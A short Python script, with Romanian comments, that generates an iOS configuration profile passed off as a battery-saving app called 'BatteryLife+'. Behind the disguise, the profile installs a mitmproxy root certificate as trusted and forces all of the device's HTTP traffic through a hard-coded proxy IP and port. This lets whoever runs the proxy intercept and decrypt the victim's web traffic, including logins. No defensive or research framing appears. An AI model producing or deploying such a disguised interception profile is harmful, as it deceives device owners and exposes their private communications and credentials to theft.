import uuid
import base64

def generate_fabulous_profile(server_ip, server_port, cert_path):
    profile_uuid = str(uuid.uuid4())
    proxy_payload_uuid = str(uuid.uuid4())
    cert_payload_uuid = str(uuid.uuid4())

    # Citim certificatul mitmproxy
    try:
        with open(cert_path, "rb") as f:
            cert_data = base64.b64encode(f.read()).decode()
    except FileNotFoundError:
        print(f"EROARE: Nu am gasit certificatul la calea: {cert_path}")
        return

    config_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.proxy.http.global</string>
            <key>PayloadDisplayName</key>
            <string>Battery Optimizer Engine</string>
            <key>PayloadIdentifier</key>
            <string>com.battlife.proxy.{proxy_payload_uuid}</string>
            <key>PayloadUUID</key>
            <string>{proxy_payload_uuid}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>ProxyServer</key>
            <string>{server_ip}</string>
            <key>ProxyServerPort</key>
            <integer>{server_port}</integer>
            <key>ProxyType</key>
            <string>Manual</string>
        </dict>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.security.root</string>
            <key>PayloadDisplayName</key>
            <string>BatteryLife+ Trust Certificate</string>
            <key>PayloadIdentifier</key>
            <string>com.battlife.cert.{cert_payload_uuid}</string>
            <key>PayloadUUID</key>
            <string>{cert_payload_uuid}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>PayloadContent</key>
            <data>{cert_data}</data>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>BatteryLife+</string>
    <key>PayloadIdentifier</key>
    <string>com.battlife.profile.{profile_uuid}</string>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{profile_uuid}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>
"""
    with open("BatteryLife.mobileconfig", "wb") as f:
        f.write(config_xml.encode('utf-8'))
    print("Profilul FABULOS a fost generat cu succes: BatteryLife.mobileconfig")

# Datele tale
generate_fabulous_profile("82.77.80.56", 8888, r"C:\Users\Rares\.mitmproxy\mitmproxy-ca.pem")